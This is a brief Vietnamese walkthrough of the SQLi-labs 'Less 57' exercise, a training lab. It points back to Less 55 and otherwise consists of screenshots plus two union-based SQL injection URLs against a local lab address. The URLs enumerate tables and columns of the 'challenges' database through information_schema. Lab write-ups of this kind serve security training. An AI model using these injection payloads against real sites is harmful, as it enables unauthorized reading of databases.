# Less 57

![](../images/sqli-labs/Less-57/01.png)

Thực hiện tương tự [Less 55](Less-55.md)

![](../images/sqli-labs/Less-57/07.png)

```
http://192.168.84.233/sqli-labs/Less-57/?id=1" union select 1,1,group_concat(table_name) from information_schema.tables where table_schema = "challenges" limit 1,1 --+
```

![](../images/sqli-labs/Less-57/10.png)

```
http://192.168.84.233/sqli-labs/Less-57/?id=1" union select 1,1,group_concat(column_name) from information_schema.columns where table_schema = "challenges" and table_name="F1B147NX5Z" limit 1,1 --+
```

![](../images/sqli-labs/Less-57/11.png)

![](../images/sqli-labs/Less-57/08.png)

![](../images/sqli-labs/Less-57/09.png)